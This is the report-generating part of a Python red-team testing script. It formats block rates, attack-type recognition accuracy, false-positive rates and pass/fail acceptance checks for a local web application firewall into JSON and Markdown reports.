    report_json_path = "/root/shield/scripts/round7/round7_report.json"
    with open(report_json_path, "w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print(f"\n[*] 详细JSON报告已保存: {report_json_path}")

    # 生成Markdown报告
    md = generate_markdown_report(results)
    report_md_path = "/root/shield/scripts/round7/round7_report.md"
    with open(report_md_path, "w") as f:
        f.write(md)
    print(f"[*] Markdown报告已保存: {report_md_path}")

    return results

def generate_markdown_report(results):
    sql = results["sql_injection"]
    xss = results["xss"]
    shell = results["webshell_upload"]
    cc = results["cc_attack"]
    ddos = results["ddos"]
    brute = results["brute_force"]
    fp = results["false_positive"]
    acc = results["acceptance"]

    md = f"""# 🔴 Round 7 红队全方位攻击测试报告

## 测试概况
- **测试时间**: {time.strftime('%Y-%m-%d %H:%M:%S')}
- **测试目标**: http://localhost:8081 (Shield防火墙)
- **后端**: http://127.0.0.1:8082
- **核心指标**: 攻击类型识别准确率

## 分类型防御效果统计

| 攻击类型 | 测试数 | 拦截数 | 穿透数 | 拦截率 | 识别正确 | 识别错误 | 识别准确率 |
|----------|--------|--------|--------|--------|----------|----------|------------|
| SQL注入 | {sql['total']} | {sql['blocked']} | {sql['penetrated']} | {sql['block_rate']:.1f}% | {sql['blocked'] - sql['misidentified']} | {sql['misidentified']} | {sql['accuracy']:.1f}% |
| XSS攻击 | {xss['total']} | {xss['blocked']} | {xss['penetrated']} | {xss['block_rate']:.1f}% | {xss['blocked'] - xss['misidentified']} | {xss['misidentified']} | {xss['accuracy']:.1f}% |
| 木马上传 | {shell['total']} | {shell['blocked']} | {shell['penetrated']} | {shell['block_rate']:.1f}% | {shell['blocked'] - shell['misidentified']} | {shell['misidentified']} | {shell['accuracy']:.1f}% |
| CC攻击 | {cc['cc_same_url']['total'] + cc['cc_concurrent']['total']} | {cc['cc_same_url']['blocked'] + cc['cc_concurrent']['blocked']} | - | - | - | - | - |
| DDoS模拟 | {ddos['threshold_flood']['total'] + ddos['burst_flood']['total']} | {ddos['threshold_flood']['blocked'] + ddos['burst_flood']['blocked']} | - | - | - | - | - |
| 爆破攻击 | {brute['login_bruteforce']['total'] + brute['api_bruteforce']['total'] + brute['dir_scan']['total']} | {brute['login_bruteforce']['blocked'] + brute['api_bruteforce']['blocked'] + brute['dir_scan']['blocked']} | - | - | - | - | - |

## 1. SQL注入测试

| 指标 | 数值 |
|------|------|
| 总Payload数 | {sql['total']} |
| 拦截数 | {sql['blocked']} |
| 穿透数 | {sql['penetrated']} |
| **拦截率** | **{sql['block_rate']:.1f}%** |
| **识别准确率** | **{sql['accuracy']:.1f}%** |

### 穿透详情
"""
    if sql["penetrated_details"]:
        for p in sql["penetrated_details"]:
            md += f"- **{p['name']}** (`{p['category']}`): status={p['status']}, payload=`{p['payload']}`\n"
    else:
        md += "- 无穿透payload\n"

    md += "\n### 识别错误详情\n\n"
    if sql["misidentified_details"]:
        for m in sql["misidentified_details"]:
            md += f"- **{m['name']}**: 期望={m['expected']}, 实际={m['detected']}, status={m['status']}\n"
    else:
        md += "- 无识别错误\n"

    md += f"""
## 2. XSS攻击测试

| 指标 | 数值 |
|------|------|
| 总Payload数 | {xss['total']} |
| 拦截数 | {xss['blocked']} |
| 穿透数 | {xss['penetrated']} |
| **拦截率** | **{xss['block_rate']:.1f}%** |
| **识别准确率** | **{xss['accuracy']:.1f}%** |

### 穿透详情
"""
    if xss["penetrated_details"]:
        for p in xss["penetrated_details"]:
            md += f"- **{p['name']}** (`{p['category']}`): status={p['status']}, payload=`{p['payload']}`\n"
    else:
        md += "- 无穿透payload\n"

    md += "\n### 识别错误详情\n\n"
    if xss["misidentified_details"]:
        for m in xss["misidentified_details"]:
            md += f"- **{m['name']}**: 期望={m['expected']}, 实际={m['detected']}, status={m['status']}\n"
    else:
        md += "- 无识别错误\n"

    md += f"""
## 3. 一句话木马上传测试

| 指标 | 数值 |
|------|------|
| 总Payload数 | {shell['total']} |
| 拦截数 | {shell['blocked']} |
| 穿透数 | {shell['penetrated']} |
| **拦截率** | **{shell['block_rate']:.1f}%** |
| **识别准确率** | **{shell['accuracy']:.1f}%** |

### 穿透详情
"""
    if shell["penetrated_details"]:
        for p in shell["penetrated_details"]:
            md += f"- **{p['name']}** (`{p['category']}`): status={p['status']}, payload=`{p['payload']}`\n"
    else:
        md += "- 无穿透payload\n"

    md += "\n### 识别错误详情\n\n"
    if shell["misidentified_details"]:
        for m in shell["misidentified_details"]:
            md += f"- **{m['name']}**: 期望={m['expected']}, 实际={m['detected']}, status={m['status']}\n"
    else:
        md += "- 无识别错误\n"

    md += f"""
## 4. CC攻击测试

| 测试项 | 总请求 | 拦截数 | 说明 |
|--------|--------|--------|------|
| 正常请求基准 | {cc['normal_requests']['total']} | {cc['normal_requests']['blocked']} | 不同URL低频率 |
| 同URL高频 | {cc['cc_same_url']['total']} | {cc['cc_same_url']['blocked']} | 首次拦截索引={cc['cc_same_url']['first_block_idx']} |
| 并发压测(20并发) | {cc['cc_concurrent']['total']} | {cc['cc_concurrent']['blocked']} | 50请求 |

## 5. DDoS模拟测试

| 测试项 | 总请求 | 拦截数 | 说明 |
|--------|--------|--------|------|
| 阈值附近流量 | {ddos['threshold_flood']['total']} | {ddos['threshold_flood']['blocked']} | 约50RPS |
| 突发流量 | {ddos['burst_flood']['total']} | {ddos['burst_flood']['blocked']} | 100并发300请求 |

## 6. 爆破攻击测试

| 测试项 | 总请求 | 拦截数 | 说明 |
|--------|--------|--------|------|
| 登录接口爆破 | {brute['login_bruteforce']['total']} | {brute['login_bruteforce']['blocked']} | 10次错误密码 |
| API认证爆破 | {brute['api_bruteforce']['total']} | {brute['api_bruteforce']['blocked']} | 8次错误token |
| 目录扫描 | {brute['dir_scan']['total']} | {brute['dir_scan']['blocked']} | 15个敏感路径 |

## 7. 误报测试

| 指标 | 数值 |
|------|------|
| 总正常请求数 | {fp['total']} |
| 误报数 | {fp['fp_count']} |
| **误报率** | **{fp['fp_rate']:.1f}%** |

### 误报详情
"""
    if fp["fp_details"]:
        for f in fp["fp_details"]:
            md += f"- **{f['name']}**: status={f['status']}, path={f['path']}\n"
    else:
        md += "- 无误报\n"

    md += f"""
## 8. 攻击类型识别错误清单

"""
    all_misidentified = []
    all_misidentified.extend([(m, "SQL注入") for m in sql["misidentified_details"]])
    all_misidentified.extend([(m, "XSS") for m in xss["misidentified_details"]])
    all_misidentified.extend([(m, "木马上传") for m in shell["misidentified_details"]])

    if all_misidentified:
        md += "| 攻击类型 | Payload名称 | 期望类型 | 实际识别类型 | 状态码 |\n"
        md += "|----------|-------------|----------|--------------|--------|\n"
        for m, attack_type in all_misidentified:
            md += f"| {attack_type} | {m['name']} | {m['expected']} | {m['detected']} | {m['status']} |\n"
    else:
        md += "未发现攻击类型识别错误。\n"

    md += f"""
## 9. 验收标准检查

| 指标 | 目标 | 实际 | 结果 |
|------|------|------|------|
| SQL注入拦截率 | >= 95% | {sql['block_rate']:.1f}% | {'✅ PASS' if acc['sql_pass'] else '❌ FAIL'} |
| XSS拦截率 | >= 95% | {xss['block_rate']:.1f}% | {'✅ PASS' if acc['xss_pass'] else '❌ FAIL'} |
| 木马上传拦截率 | >= 95% | {shell['block_rate']:.1f}% | {'✅ PASS' if acc['shell_pass'] else '❌ FAIL'} |
| DDoS模拟有拦截 | 有拦截 | {'有' if acc['ddos_pass'] else '无'} | {'✅ PASS' if acc['ddos_pass'] else '❌ FAIL'} |
| 爆破攻击有拦截 | 有拦截 | {'有' if acc['brute_pass'] else '无'} | {'✅ PASS' if acc['brute_pass'] else '❌ FAIL'} |
| 误报率 | < 2% | {fp['fp_rate']:.1f}% | {'✅ PASS' if acc['fp_pass'] else '❌ FAIL'} |
| SQL注入识别准确率 | >= 95% | {sql['accuracy']:.1f}% | {'✅ PASS' if acc['sql_acc_pass'] else '❌ FAIL'} |
| XSS识别准确率 | >= 95% | {xss['accuracy']:.1f}% | {'✅ PASS' if acc['xss_acc_pass'] else '❌ FAIL'} |
| 木马上传识别准确率 | >= 95% | {shell['accuracy']:.1f}% | {'✅ PASS' if acc['shell_acc_pass'] else '❌ FAIL'} |

## 10. 总体结论

**总体结果**: {'✅ 全部通过' if acc['overall_pass'] else '❌ 未全部通过 - 需继续修复'}

"""
    if not acc["overall_pass"]:
        md += "### 未通过项及建议\n\n"
        if not acc["sql_pass"]:
            md += "- **SQL注入拦截率不足**: 建议增强SQL注入检测规则\n"
        if not acc["xss_pass"]:
            md += "- **XSS拦截率不足**: 建议增强XSS检测规则\n"
        if not acc["shell_pass"]:
            md += "- **木马上传拦截率不足**: 建议增加文件上传检测模块\n"
        if not acc["ddos_pass"]:
            md += "- **DDoS模拟无拦截**: 建议检查DDoS阈值配置\n"
        if not acc["brute_pass"]:
            md += "- **爆破攻击无拦截**: 建议检查爆破检测配置\n"
        if not acc["fp_pass"]:
            md += "- **误报率过高**: 建议优化规则减少误杀\n"
        if not acc["sql_acc_pass"]:
            md += "- **SQL注入识别准确率不足**: 建议增加攻击类型标注\n"
        if not acc["xss_acc_pass"]:
            md += "- **XSS识别准确率不足**: 建议增加攻击类型标注\n"
        if not acc["shell_acc_pass"]:
            md += "- **木马上传识别准确率不足**: 建议增加攻击类型标注\n"
    else:
        md += "所有核心指标均达到验收标准，Round 7全方位攻击测试通过。\n"

    md += """
## 11. 改进建议

1. **攻击类型识别**: 建议在拦截响应中增加 X-Block-Reason 头，明确标注攻击类型
2. **木马上传检测**: 当前防火墙可能没有专门的文件上传检测模块，建议增加
3. **日志增强**: 建议在日志中增加 attack_type 字段，便于审计和统计
4. **性能优化**: 高并发场景下延迟略有增加，可考虑优化
"""
    return md

if __name__ == "__main__":
    main()
